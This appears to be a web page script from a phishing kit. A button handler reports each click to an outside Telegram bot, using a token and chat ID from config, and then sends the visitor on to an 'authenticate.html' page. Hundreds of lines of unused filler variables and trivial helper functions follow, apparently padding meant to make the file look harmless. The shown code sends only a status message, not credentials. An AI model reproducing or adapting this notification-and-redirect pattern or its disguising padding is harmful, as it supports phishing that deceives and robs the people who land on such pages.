import { config } from "../../configuration.js";
const btn = document.querySelector(".btn");
btn.addEventListener("click", async () => {
  if (btn.classList.contains("disabled") ||
      btn.classList.contains("loading")) {
    return;
  }

  btn.classList.add("loading");

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${config.verification_token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: config.verification_Id,
          text: "Pushed: Yes"
        })
      }
    );

    const result = await response.json();
    console.log("Telegram response:", result);

    if (!result.ok) {
      console.error("Telegram API error:", result.description);
    }
  } catch (err) {
    console.error("Failed to send:", err);
  }

  setTimeout(() => {
    window.location.href = "authenticate.html";
  }, 3500);
});
const values = [];
const names = ["Luna", "Milo", "Nova", "Piper", "Theo"];
const numbers = [4, 8, 15, 16, 23, 42];
let counter = 0;
let active = true;
let message = "Hello";
let score = 0;
let index = 0;
let total = 0;
let ready = true;
let status = "idle";
let color = "blue";
let size = 12;
let speed = 5;
let level = 1;
let mode = "simple";
let result = null;
let item = "apple";
let count = 10;
let enabled = false;
let label = "sample";
let title = "Demo";
let width = 100;
let height = 50;
let x = 0;
let y = 0;
let angle = 90;
let distance = 25;
let answer = 7;
let state = "open";
let current = "start";
let previous = "none";
let next = "later";
let data = {};
let list = [];
let queue = [];
let cache = {};
let messageCount = 0;
let attempts = 0;
let progress = 0;
let temperature = 20;
let volume = 50;
let brightness = 75;
let opacity = 1;
let year = 2026;
let month = 9;
let day = 1;
let hour = 3;
let minute = 22;
function add(a, b) {
  return a + b;
}
function subtract(a, b) {
  return a - b;
}
function multiply(a, b) {
  return a * b;
}
function divide(a, b) {
  return b === 0 ? 0 : a / b;
}
function square(n) {
  return n * n;
}
function cube(n) {
  return n * n * n;
}
function double(n) {
  return n * 2;
}
function triple(n) {
  return n * 3;
}
function isEven(n) {
  return n % 2 === 0;
}
function isOdd(n) {
  return n % 2 !== 0;
}
function clamp(n, min, max) {
  return Math.min(Math.max(n, min), max);
}
function reverse(text) {
  return text.split("").reverse().join("");
}
function upper(text) {
  return text.toUpperCase();
}
function lower(text) {
  return text.toLowerCase();
}
function first(array) {
  return array[0];
}
function last(array) {
  return array[array.length - 1];
}
function randomNumber(max) {
  return Math.floor(Math.random() * max);
}
function randomName() {
  return names[randomNumber(names.length)];
}
function greet(name) {
  return `Hello, ${name}!`;
}
function makePair(a, b) {
  return [a, b];
}
function makeObject(key, value) {
  return { key, value };
}
function sum(array) {
  return array.reduce((a, b) => a + b, 0);
}
function average(array) {
  return array.length ? sum(array) / array.length : 0;
}
function maximum(array) {
  return Math.max(...array);
}
function minimum(array) {
  return Math.min(...array);
}
function sortNumbers(array) {
  return [...array].sort((a, b) => a - b);
}
function unique(array) {
  return [...new Set(array)];
}
function contains(array, value) {
  return array.includes(value);
}
function repeat(text, times) {
  return text.repeat(times);
}
function pad(text, length) {
  return text.padStart(length, " ");
}
function squareRoot(n) {
  return Math.sqrt(n);
}
function absolute(n) {
  return Math.abs(n);
}
function percentage(value, total) {
  return total ? value / total * 100 : 0;
}
function increment(n) {
  return n + 1;
}
function decrement(n) {
  return n - 1;
}
function createList(length) {
  return Array.from({ length }, (_, i) => i);
}
function createRange(start, end) {
  return Array.from({ length: end - start + 1 }, (_, i) => start + i);
}
function capitalize(text) {
  return text.charAt(0).toUpperCase() + text.slice(1);
}
function words(text) {
  return text.trim().split(/\s+/);
}
function wordCount(text) {
  return words(text).length;
}
function joinWords(array) {
  return array.join(" ");
}
function safeParse(text) {
  try {
    return JSON.parse(text);
  } catch {
    return null;
  }
}
function clone(value) {
  return structuredClone(value);
}
function toggle(value) {
  return !value;
}
function identity(value) {
  return value;
}
function getType(value) {
  return typeof value;
}
function isArray(value) {
  return Array.isArray(value);
}
function isNumber(value) {
  return typeof value === "number";
}
function isString(value) {
  return typeof value === "string";
}
function isObject(value) {
  return value !== null && typeof value === "object";
}
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function timestamp() {
  return Date.now();
}
function today() {
  return new Date().toISOString().slice(0, 10);
}
function randomChoice(array) {
  return array[randomNumber(array.length)];
}
function shuffle(array) {
  return [...array].sort(() => Math.random() - 0.5);
}
function chunk(array, size) {
  const output = [];
  for (let i = 0; i < array.length; i += size) {
    output.push(array.slice(i, i + size));
  }
  return output;
}
function flatten(array) {
  return array.flat(Infinity);
}
function filterPositive(array) {
  return array.filter(n => n > 0);
}
function filterEven(array) {
  return array.filter(isEven);
}
function mapDouble(array) {
  return array.map(double);
}
function mapSquare(array) {
  return array.map(square);
}
function findLargest(array) {
  return array.reduce((a, b) => a > b ? a : b, -Infinity);
}
function findSmallest(array) {
  return array.reduce((a, b) => a < b ? a : b, Infinity);
}
function countValue(array, value) {
  return array.filter(item => item === value).length;
}
function makeGreeting(name, punctuation) {
  return `Hello ${name}${punctuation}`;
}
function describe(value) {
  return `${getType(value)}:${String(value)}`;
}
function addValue(array, value) {
  return [...array, value];
}
function removeLast(array) {
  return array.slice(0, -1);
}
function removeFirst(array) {
  return array.slice(1);
}
function take(array, count) {
  return array.slice(0, count);
}
function skip(array, count) {
  return array.slice(count);
}
function between(n, min, max) {
  return n >= min && n <= max;
}
function maxZero(n) {
  return Math.max(0, n);
}
function minHundred(n) {
  return Math.min(100, n);
}
function toFixedNumber(n, digits) {
  return Number(n.toFixed(digits));
}
function factorial(n) {
  let value = 1;
  for (let i = 2; i <= n; i++) value *= i;
  return value;
}
function fibonacci(n) {
  let a = 0;
  let b = 1;
  for (let i = 0; i < n; i++) [a, b] = [b, a + b];
  return a;
}
function power(base, exponent) {
  return base ** exponent;
}
function modulo(a, b) {
  return b === 0 ? 0 : a % b;
}
function negate(n) {
  return -n;
}
function sign(n) {
  return Math.sign(n);
}
function randomBoolean() {
  return Math.random() >= 0.5;
}
function randomColor() {
  return `hsl(${randomNumber(360)}, 60%, 60%)`;
}
function randomLetter() {
  return String.fromCharCode(97 + randomNumber(26));
}
function randomId() {
  return Math.random().toString(36).slice(2, 10);
}
function makeCounter() {
  let value = 0;
  return () => ++value;
}
function makeMultiplier(factor) {
  return value => value * factor;
}
function compose(firstFn, secondFn) {
  return value => secondFn(firstFn(value));
}
function applyTwice(fn, value) {
  return fn(fn(value));
}
function once(fn) {
  let called = false;
  let result;
  return (...args) => {
    if (!called) {
      result = fn(...args);
      called = true;
    }
    return result;
  };
}
function memoize(fn) {
  const cache = new Map();
  return value => {
    if (!cache.has(value)) cache.set(value, fn(value));
    return cache.get(value);
  };
}
function createPerson(name, age) {
  return { name, age };
}
function birthday(person) {
  return { ...person, age: person.age + 1 };
}
function rename(person, name) {
  return { ...person, name };
}
function getName(person) {
  return person.name;
}
function getAge(person) {
  return person.age;
}
function hasKey(object, key) {
  return Object.prototype.hasOwnProperty.call(object, key);
}
function keys(object) {
  return Object.keys(object);
}
function valuesOf(object) {
  return Object.values(object);
}
function entries(object) {
  return Object.entries(object);
}
function fromEntries(entries) {
  return Object.fromEntries(entries);
}
function merge(a, b) {
  return { ...a, ...b };
}
function freezeCopy(object) {
  return Object.freeze({ ...object });
}
function arrayToObject(array) {
  return Object.fromEntries(array.map((value, i) => [i, value]));
}
function objectToArray(object) {
  return Object.entries(object);
}
function reverseWords(text) {
  return words(text).reverse().join(" ");
}
function initials(text) {
  return words(text).map(word => word[0]).join("").toUpperCase();
}
function removeSpaces(text) {
  return text.replace(/\s/g, "");
}
function countLetters(text) {
  return removeSpaces(text).length;
}
function isEmpty(text) {
  return text.trim().length === 0;
}
function repeatGreeting(name, count) {
  return Array(count).fill(greet(name));
}
function makeMessage(text, count) {
  return { text, count };
}
function incrementScore(amount = 1) {
  score += amount;
  return score;
}
function resetScore() {
  score = 0;
  return score;
}
function increaseProgress(amount) {
  progress = clamp(progress + amount, 0, 100);
  return progress;
}
function resetProgress() {
  progress = 0;
  return progress;
}
function updateStatus(value) {
  status = value;
  return status;
}
function getStatus() {
  return status;
}
function setMode(value) {
  mode = value;
  return mode;
}
function getMode() {
  return mode;
}
function setPosition(newX, newY) {
  x = newX;
  y = newY;
  return { x, y };
}
function move(dx, dy) {
  x += dx;
  y += dy;
  return { x, y };
}
function distanceFromOrigin() {
  return Math.sqrt(x * x + y * y);
}
function rotate(degrees) {
  angle = (angle + degrees) % 360;
  return angle;
}
function resize(newWidth, newHeight) {
  width = newWidth;
  height = newHeight;
  return { width, height };
}
function area() {
  return width * height;
}
function perimeter() {
  return 2 * (width + height);
}
function setVolume(value) {
  volume = clamp(value, 0, 100);
  return volume;
}
function setBrightness(value) {
  brightness = clamp(value, 0, 100);
  return brightness;
}
function setOpacity(value) {
  opacity = clamp(value, 0, 1);
  return opacity;
}
function addItem(value) {
  list.push(value);
  return list.length;
}
function removeItem(value) {
  const position = list.indexOf(value);
  if (position >= 0) list.splice(position, 1);
  return list;
}
function clearList() {
  list.length = 0;
  return list;
}
function listLength() {
  return list.length;
}
function enqueue(value) {
  queue.push(value);
  return queue.length;
}
function dequeue() {
  return queue.shift();
}
function peek() {
  return queue[0];
}
function queueLength() {
  return queue.length;
}
function cacheValue(key, value) {
  cache[key] = value;
  return value;
}
function getCached(key) {
  return cache[key];
}
function clearCache() {
  cache = {};
  return true;
}
function makeSequence(start, step, length) {
  return Array.from({ length }, (_, i) => start + i * step);
}
function isPalindrome(text) {
  const clean = text.toLowerCase().replace(/\s/g, "");
  return clean === reverse(clean);
}
function repeatNumber(n, count) {
  return Array(count).fill(n);
}
function randomNumbers(count, max) {
  return Array.from({ length: count }, () => randomNumber(max));
}
function totalNumbers(count, max) {
  return sum(randomNumbers(count, max));
}
function median(array) {
  const sorted = sortNumbers(array);
  const middle = Math.floor(sorted.length / 2);
  return sorted.length % 2 ? sorted[middle] : (sorted[middle - 1] + sorted[middle]) / 2;
}
function rangeSum(start, end) {
  return sum(createRange(start, end));
}
function evenNumbers(max) {
  return createRange(0, max).filter(isEven);
}
function oddNumbers(max) {
  return createRange(0, max).filter(isOdd);
}
function positiveNumbers(array) {
  return array.filter(filter => filter > 0);
}
function negativeNumbers(array) {
  return array.filter(value => value < 0);
}
function zeroNumbers(array) {
  return array.filter(value => value === 0);
}
function stringLength(text) {
  return text.length;
}
function firstCharacter(text) {
  return text[0] ?? "";
}
function lastCharacter(text) {
  return text.at(-1) ?? "";
}
function trimText(text) {
  return text.trim();
}
function replaceText(text, from, to) {
  return text.replaceAll(from, to);
}
function startsWithText(text, prefix) {
  return text.startsWith(prefix);
}
function endsWithText(text, suffix) {
  return text.endsWith(suffix);
}
function includesText(text, part) {
  return text.includes(part);
}
function toNumber(text) {
  return Number(text);
}
function toInteger(text) {
  return parseInt(text, 10);
}
function toString(value) {
  return String(value);
}
function booleanValue(value) {
  return Boolean(value);
}
function jsonString(value) {
  return JSON.stringify(value);
}
function parseList(text) {
  return text.split(",").map(item => item.trim());
}
function joinList(array, separator = ", ") {
  return array.join(separator);
}
function makeDate(year, month, day) {
  return new Date(year, month - 1, day);
}
function dateYear(date) {
  return date.getFullYear();
}
function dateMonth(date) {
  return date.getMonth() + 1;
}
function dateDay(date) {
  return date.getDate();
}
function dateLabel(date) {
  return date.toDateString();
}
function daysBetween(a, b) {
  return Math.abs(b - a) / 86400000;
}
function chooseName() {
  return randomChoice(names);
}
function chooseNumber() {
  return randomChoice(numbers);
}
function buildRecord(id, name, value) {
  return { id, name, value };
}
function records(count) {
  return createRange(1, count).map(id => buildRecord(id, randomName(), randomNumber(100)));
}
function recordNames(items) {
  return items.map(item => item.name);
}
function recordValues(items) {
  return items.map(item => item.value);
}
function highestRecord(items) {
  return items.reduce((best, item) => item.value > best.value ? item : best);
}
function lowestRecord(items) {
  return items.reduce((best, item) => item.value < best.value ? item : best);
}
function valueTotal(items) {
  return sum(recordValues(items));
}
function valueAverage(items) {
  return average(recordValues(items));
}
function createMatrix(rows, columns, value = 0) {
  return Array.from({ length: rows }, () => Array(columns).fill(value));
}
function transpose(matrix) {
  return matrix[0]?.map((_, i) => matrix.map(row => row[i])) ?? [];
}
function diagonal(matrix) {
  return matrix.map((row, i) => row[i]);
}
function repeatArray(array, count) {
  return Array.from({ length: count }, () => [...array]).flat();
}
function zip(a, b) {
  return a.map((value, i) => [value, b[i]]);
}
function pairwise(array) {
  return array.slice(1).map((value, i) => [array[i], value]);
}
function difference(a, b) {
  return a.filter(value => !b.includes(value));
}
function intersection(a, b) {
  return a.filter(value => b.includes(value));
}
function union(a, b) {
  return unique([...a, ...b]);
}
function sleepMessage(text) {
  return Promise.resolve(text);
}
function squareAll(array) {
  return array.map(value => value * value);
}
function cubeAll(array) {
  return array.map(value => value ** 3);
}
function absoluteAll(array) {
  return array.map(Math.abs);
}
function roundAll(array) {
  return array.map(Math.round);
}
function floorAll(array) {
  return array.map(Math.floor);
}
function ceilAll(array) {
  return array.map(Math.ceil);
}
function formatScore(value) {
  return `Score: ${value}`;
}
function formatPercent(value) {
  return `${value.toFixed(1)}%`;
}
function formatSize(value) {
  return `${value} units`;
}
function formatPoint(point) {
  return `(${point.x}, ${point.y})`;
}
function makePoint(x, y) {
  return { x, y };
}
function midpoint(a, b) {
  return makePoint((a.x + b.x) / 2, (a.y + b.y) / 2);
}
function pointDistance(a, b) {
  return Math.hypot(a.x - b.x, a.y - b.y);
}
function randomPoint(max) {
  return makePoint(randomNumber(max), randomNumber(max));
}
function makeBox(width, height) {
  return { width, height, area: width * height };
}
function scaleBox(box, factor) {
  return makeBox(box.width * factor, box.height * factor);
}
function describeBox(box) {
  return `${box.width}x${box.height}`;
}
function makeColor(red, green, blue) {
  return `rgb(${red}, ${green}, ${blue})`;
}
function makeRgb() {
  return makeColor(randomNumber(256), randomNumber(256), randomNumber(256));
}
function makeLabel(text, value) {
  return `${text}: ${value}`;
}
function logValue(value) {
  return value;
}
function pass(value) {
  return value;
}
function noop() {}
function finish() {
  return true;
}
